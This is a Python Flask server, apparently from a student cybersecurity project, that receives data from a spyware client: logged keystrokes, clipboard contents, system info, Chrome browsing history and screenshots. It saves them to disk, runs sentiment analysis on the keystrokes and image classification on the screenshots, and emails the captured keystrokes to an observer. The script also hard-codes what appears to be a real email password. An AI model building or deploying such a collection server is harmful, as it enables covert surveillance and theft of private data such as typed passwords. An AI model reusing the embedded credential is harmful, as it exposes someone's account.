from flask import Flask, request, jsonify
import os
import base64
import pandas as pd
from transformers import pipeline, CLIPProcessor, CLIPModel
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import re
import string
import nltk
from nltk.corpus import stopwords
from nltk.stem import PorterStemmer
import time
from PIL import Image
import io
import torch

app = Flask(__name__)

# Directory to store received data
DATA_DIR = r'C:\Users\rahul\Music\btech\sem7\Cyber_security\output'
os.makedirs(DATA_DIR, exist_ok=True)

# Initialize sentiment analysis model for keystrokes
sentiment_analysis = pipeline("sentiment-analysis", framework="pt")

# Initialize the CLIP model for image sentiment analysis
clip_model = CLIPModel.from_pretrained("openai/clip-vit-base-patch32")
clip_processor = CLIPProcessor.from_pretrained("openai/clip-vit-base-patch32")

# Ensure you have the necessary NLTK resources
nltk.download('stopwords')

# Initialize the stemmer and stop words
stemmer = PorterStemmer()
stop_words = set(stopwords.words('english'))

# Global variable to track alerts sent
alert_counter = 0
alert_timestamp = time.time()

# Set the threshold for maximum alerts and time period (in seconds)
MAX_ALERTS = 3
TIME_PERIOD = 900  # 15 minutes

# Function to clean and process keystrokes
def clean_keystrokes(keystrokes):
    buffer = []

    for item in keystrokes.split(' '):
        if item == "Key.backspace":
            if buffer:  # Remove the last character if there's anything in the buffer
                buffer.pop()
        elif item == "Key.space":
            buffer.append(" ")  # Add a space to the buffer
        elif not item.startswith('Key.'):  # Exclude special keys
            buffer.append(item)  # Add regular characters to the buffer

    # Join the buffer into a single string
    text = ''.join(buffer)

    # Post-process the text: normalize, punctuation, and formatting
    text = re.sub(r'\s+', ' ', text)  # Replace multiple spaces with a single space
    text = text.strip()  # Remove leading/trailing spaces
    text = text.lower()  # Convert to lowercase

    # Remove punctuation
    text = text.translate(str.maketrans('', '', string.punctuation))

    # Tokenization
    tokens = text.split()

    # Remove stop words
    tokens = [word for word in tokens if word not in stop_words]

    # Stemming
    tokens = [stemmer.stem(word) for word in tokens]

    # Join tokens back into a single string
    cleaned_text = ' '.join(tokens)

    return cleaned_text

# Function to analyze sentiment of keystrokes
def analyze_sentiment(text):
    result = sentiment_analysis(text)
    return result[0]['label'], result[0]['score']

# Function to analyze sentiment of the image using CLIP model
def analyze_image_with_clip(image_bytes):
    image = Image.open(io.BytesIO(image_bytes))
    
    # Define labels to match with the image
    labels = ["a happy person", "a sad person", "an inappropriate scene", "a dangerous situation", "neutral"]
    
    # Preprocess image and text
    inputs = clip_processor(text=labels, images=image, return_tensors="pt", padding=True)

    # Run the model and get probabilities
    outputs = clip_model(**inputs)
    logits_per_image = outputs.logits_per_image  # Image-text similarity scores
    probs = logits_per_image.softmax(dim=1)  # Probabilities
    
    # Get the most probable label
    label_index = torch.argmax(probs).item()
    confidence = probs[0, label_index].item()

    return labels[label_index], confidence

# Function to send an email alert using Outlook SMTP server
def send_email_alert(subject, body):
    # Outlook SMTP server configuration
    sender_email = "BL.EN.U4EAC21033@bl.students.amrita.edu"  # Replace with your Outlook email
    receiver_email = "BL.EN.U4EAC21031@bl.students.amrita.edu"  # Replace with the receiver's email
    password = "neehar@0309"  # Replace with your Outlook account password or app-specific password

    # Create the email content
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    try:
        # Establish connection to Outlook SMTP server
        server = smtplib.SMTP('smtp.office365.com', 587)  # Outlook/Office 365 SMTP server
        server.starttls()  # Enable TLS encryption
        server.login(sender_email, password)  # Login with Outlook credentials

        # Send the email
        server.sendmail(sender_email, receiver_email, msg.as_string())
        print("Email alert sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")
    finally:
        server.quit()

# Function to trigger alert if negative sentiment is detected from keystrokes
def trigger_alert_if_negative(keystrokes):
    global alert_counter, alert_timestamp

    # Clean the keystrokes
    cleaned_keystrokes = clean_keystrokes(keystrokes)
    sentiment, confidence = analyze_sentiment(cleaned_keystrokes)

    # Check if negative sentiment is detected and confidence is high
    if sentiment == 'NEGATIVE' and confidence > 0.7:  # Adjust threshold as needed
        current_time = time.time()
        
        # Reset the counter if the time period has passed
        if current_time - alert_timestamp > TIME_PERIOD:
            alert_counter = 0  # Reset the counter
            alert_timestamp = current_time  # Reset the timestamp

        # Check if the counter has exceeded the maximum allowed alerts
        if alert_counter < MAX_ALERTS:
            subject = "ALERT: Negative Sentiment Detected"
            body = f"Potential negative mood detected:\nKeystrokes: {cleaned_keystrokes}\nConfidence: {confidence*100:.2f}%"
            send_email_alert(subject, body)
            alert_counter += 1  # Increment the alert counter
            print("Alert triggered: Sent email to observer.")
        else:
            print("Alert not sent: Maximum alert threshold reached.")

# Function to trigger alert if negative sentiment is detected from image
def trigger_alert_if_image_negative(image_bytes):
    label, confidence = analyze_image_with_clip(image_bytes)

    print(f"Detected label: {label}, Confidence: {confidence:.2f}")

    # If the label is negative or inappropriate, send an email alert
    if label in ["a sad person", "an inappropriate scene", "a dangerous situation"] and confidence > 0.7:
        subject = "ALERT: Negative Sentiment Detected in Image"
        body = f"Potential negative or inappropriate content detected:\nLabel: {label}\nConfidence: {confidence*100:.2f}%"
        send_email_alert(subject, body)
        print("Alert triggered: Sent email to observer.")
    else:
        print("No negative or inappropriate content detected.")

@app.route('/status', methods=['GET'])
def status():
    return jsonify({'status': 'Server is running'}), 200

@app.route('/receive', methods=['POST'])
def receive_data():
    data = request.get_json()
    if data is None:
        return jsonify({'error': 'Invalid JSON'}), 400
    try:
        # Process and log keystrokes
        if 'keystrokes' in data:
            keystrokes = data['keystrokes']
            with open(os.path.join(DATA_DIR, 'logs.txt'), 'a') as f:
                f.write(keystrokes + '\n')
            # Analyze sentiment in a separate thread
            threading.Thread(target=trigger_alert_if_negative, args=(keystrokes,), daemon=True).start()
        
        # Process clipboard, Chrome history, etc.
        if 'clipboard_data' in data:
            with open(os.path.join(DATA_DIR, 'clipboard.txt'), 'a') as f:
                f.write(data['clipboard_data'] + '\n')
        if 'computer_info' in data:
            df_computer_info = pd.DataFrame([data['computer_info']])
            df_computer_info.to_excel(os.path.join(DATA_DIR, 'computer_info.xlsx'), index=False)
        if 'chrome_history' in data:
            df_chrome_history = pd.DataFrame(data['chrome_history'])
            df_chrome_history.to_excel(os.path.join(DATA_DIR, 'chrome_history.xlsx'), index=False)
        if 'screenshot' in data:
            screenshot_bytes = base64.b64decode(data['screenshot'])
            with open(os.path.join(DATA_DIR, 'screenshot.png'), 'wb') as f:
                f.write(screenshot_bytes)
            # Analyze sentiment in a separate thread
            threading.Thread(target=trigger_alert_if_image_negative, args=(screenshot_bytes,), daemon=True).start()

        return jsonify({'status': 'Data received successfully'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
